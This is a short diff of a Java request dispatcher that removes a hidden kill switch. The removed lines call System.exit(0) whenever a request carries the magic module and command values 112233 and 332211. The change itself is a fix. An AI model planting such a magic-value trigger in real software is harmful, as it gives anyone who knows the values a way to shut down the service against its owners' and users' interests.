@@ -46,11 +46,7 @@ public class DispatcherImpl implements Dispatcher {
         if ((session == null) || (request == null)) {
             return;
         }
-
-        if ((request.getModule() == 112233) && (request.getCmd() == 332211)) {
-            System.exit(0);
-        }
-
+        
         int module = request.getModule();
         CommandHandler handler = MODULE_HANDLERS.get(Integer.valueOf(module));
         if (handler == null) {
